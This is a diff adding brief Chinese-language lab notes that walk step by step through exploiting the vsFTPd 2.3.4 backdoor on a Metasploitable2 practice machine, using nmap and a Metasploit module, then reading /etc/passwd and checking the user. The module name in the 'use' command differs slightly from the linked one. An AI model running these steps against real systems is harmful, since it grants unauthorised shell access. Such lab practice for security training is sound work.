@@ -1,0 +1,19 @@
+metasploitable2
+
+vsftp
+---
+kali端
+開啟終端機nmap --script vuln targetip
+得知一vsFTPd 2.3.4 後門漏洞
+啟動msfconsole
+search vsftp
+use exploit/unix/ftp/vsftp_234_backdoor
+show target
+show options確認相關參數
+到raipd7 確認相關用法
+https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST targetip
+show options 再次確認參數
+exploit 進行攻擊
+cat /etc/passwd 確認帳號
+whoami 確認自己現在的帳號
